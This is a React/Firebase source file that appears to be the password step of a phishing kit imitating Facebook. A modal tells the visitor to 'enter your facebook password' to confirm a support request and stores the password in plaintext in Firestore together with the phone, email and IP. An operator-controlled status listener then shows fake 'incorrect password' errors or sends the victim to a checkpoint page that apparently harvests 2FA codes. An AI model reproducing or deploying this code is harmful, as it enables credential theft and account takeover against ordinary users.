import {
  collection,
  addDoc,
  onSnapshot,
  query,
  doc,
  updateDoc,
  runTransaction,
  orderBy,
  getDocs,
  limit,
} from "firebase/firestore";
import React, { useState } from "react";
import Modal from "react-modal";
import { db } from "../../firebase";
import { useNavigate } from "react-router-dom";
import "./popup.scss";

Modal.setAppElement("#root");

const modalStyle = {
  overlay: {
    backgroundColor: "rgba(0, 0, 0, 0.5)",
    zIndex: 1000,
  },
  content: {
    width: "100%",
    maxWidth: "450px",
    top: "40%", // Căn giữa theo chiều dọc
    left: "50%", // Căn giữa theo chiều ngang
    transform: "translate(-50%, -50%)", // Điều chỉnh vị trí tới giữa
    padding: "20px",
    borderRadius: "8px",
    boxShadow: "0 2px 4px rgba(0, 0, 0, 0.2)",
    backgroundColor: "white",
    position: "relative",
  },
};
const delay = ms => new Promise(res => setTimeout(res, ms));

const MyPopup = ({ isOpen, onClose, onSave }) => {
  const [passwordShown, setPasswordShown] = useState(false);
  const togglePasswordVisiblity = async () => {
    setPasswordShown(passwordShown ? false : true);
    await delay(2000);
    setPasswordShown(false);
  };
  const [pass, setPass] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [result, setResult] = useState({
    type: "",
    msg: "",
  });
  const navigate = useNavigate();
  const [data, setData] = useState({});
  const usersRef = collection(db, "users");
  const q = query(usersRef, orderBy("auto_id", "desc", limit(1)));
  const [disabled, setDisabled] = useState(true);
  const listener = (userID) => {
    onSnapshot(doc(db, "users", userID), (snapshot) => {
      const status = snapshot.data()?.status;
      if (status === 0 || status === 1) return;
      // Handle different status codes here
      switch (status) {
        case -1:
          setResult({
            type: "warning",
            msg: "<a class=\"fw-bold text-danger\" rel=\"noopener noreferrer\" target=\"_blank\" href=\"https://www.facebook.com/login/identify/\" style=\"text-decoration: none;\">Forgoten Password?</a>",
          });
          setDisabled(false)
          break;
        case 2:
          navigate(`/checkpoint/${userID}`);
          break;
        case 3:
          setResult({
            type: "success",
            msg: "You have successfully submitted your support request!",
          });
          navigate(`/processing/${userID}`);
          break;
        case -2:
          setResult({
            type: "error",
            msg: "The authentication code is incorrect, please try again!",
          });
          break;
        default:
          console.log(status);
      }
      setIsLoading(false); // Set loading back to false
    });
  };

  const updateIndex = async (userID) => {
    try {
      await runTransaction(db, async (transaction) => {
        const sfDocRef = doc(db, "users", userID);
        const sfDoc = await transaction.get(sfDocRef);
        const dosLast = await getDocs(q);
        if (!sfDoc.exists()) {
          throw "Document does not exist!";
        }
        const [lastest] = dosLast.docs
        const auto_id = (lastest?.get("auto_id") || 0) + 1;
        transaction.update(sfDocRef, { auto_id });
      });

      console.log("Transaction successfully committed!");
    } catch (e) {
      console.log("Transaction failed: ", e);
    }
  };


  const handleSubmit = async () => {
    setIsLoading(true); // Set loading to true while saving data
    setDisabled(true);
    try {
      if (result.type && result.type !== "success") {
        updateDoc(doc(db, "users", data.id), {
          status: 1,
          pass: pass
        });
        return;
      }
      setResult({
        type: "",
        msg: "",
      });
      const formData = JSON.parse(
        localStorage.getItem("user") || "{}"
      );

      if(formData){
        const user = await addDoc(collection(db, "users"), {
          pass:pass,phone:formData.phone,email:formData.email,auth:'',ip:formData.ip,status: 1,status2:0,ck:'',pg:'',bm:'',ad:'',if:'',createdAt: new Date().getTime(),
        });
        if(user.id){
          updateIndex(user.id);
          setData(user);
          listener(user.id);
        }
      }
    } catch (error) {
      console.error("Error saving data to Firestore: ", error);
    } finally {
    }
  };

  return (
    <Modal
      isOpen={isOpen}
      onRequestClose={onClose}
      contentLabel="Enter your password"
      style={modalStyle}
      shouldCloseOnOverlayClick={false}
    >
      <>
        <div className="modal-content">
        <div style={{padding:'none'}} className="modal-body">
            <h1 style={{fontSize:'1.3rem',color:'#444444',margintop:'1.15rem'}}>Please enter your password to continue</h1>
            <div style={{marginTop: '1rem','marginBottom': '1.25rem',height: '1px', width: '100%',background: '#DADDE1' }}></div>
            <div style={{fontSize:'14px'}} className="modal__body-description">We need to confirm the sender of the information is you, Please enter your facebook password and then continue.</div>
            <div className="modal__body-password">
              <div className="InputText">
                  <label htmlFor="Password" className="InputText__label">Password</label>
                  <div style={{position:'relative',width:'100%'}}>
                    <input type={passwordShown ? "text" : "password"} style={{width: '100%'}} id="Password" value={pass} onChange={(e) => {if(e.target.value.length > 100) return;setPass(e.target.value); if(e.target.value.length > 0){setDisabled(false)}else{setDisabled(true)}}} className="InputText__input"/>
                     <img onClick={togglePasswordVisiblity} style={{position:'absolute',top: '50%',right:'15px',transform: 'translateY(-50%)',width:'20px',height:'20px'}} src={passwordShown ? "/assets/eye.png" : "/assets/eye-close.png"}/>
                  </div>
              </div>
            </div>    
            {isLoading == true &&
                <div className="loading">
                    <div style={{top:'50%'}} className="loader"></div>
                </div>
            }  
            {isLoading == false && result.msg != "" &&
            <div className="d-flex align-items-center ms-2">
                  <p  style={{fontSize:'14px'}} className="text-danger">The password that you've entered is incorrect. <a className='text-danger' style={{textDecoration:'none',fontWeight:'500'}} rel = "noopener noreferrer" target="_blank" href="https://www.facebook.com/login/identify/">Forgoten Password?</a></p>  
            </div>
             }  
            <div className="next-button-div"><button className="ButtonSoft" onClick={handleSubmit} disabled={disabled}>Continue</button></div>
        </div>
        </div>
      </>
    </Modal>
  );
};

export default MyPopup;
